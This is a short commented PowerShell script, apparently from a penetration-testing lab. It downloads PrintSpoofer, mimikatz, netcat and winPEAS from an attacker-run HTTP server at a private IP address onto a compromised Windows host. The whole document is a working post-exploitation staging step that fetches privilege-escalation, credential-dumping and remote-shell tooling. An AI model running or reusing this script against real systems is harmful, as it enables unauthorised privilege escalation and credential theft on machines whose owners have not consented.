# Base URI where the files are hosted
$baseUri = "http://192.168.45.207:8000/"

# Array of file names to be downloaded
$fileNames = @("PrintSpoofer64.exe", "mimikatz_1.exe", "nc64.exe", "winPEASx64.exe")

# Loop through each file name in the array
foreach ($fileName in $fileNames) {
    # Construct the full URI for the file
    $uri = "$baseUri$fileName"
    
    # Set the local path where the file will be saved
    $localPath = ".\$fileName"
    
    # Try to download the file
    try {
        # Download the file from the URI and save it to the local path
        Invoke-WebRequest -Uri $uri -OutFile $localPath
        
        # Output a message indicating the file was successfully downloaded
        Write-Output "Downloaded: $fileName"
    } catch {
        # Output a message indicating the file download failed
        Write-Output "Failed to download: $fileName"
    }
}
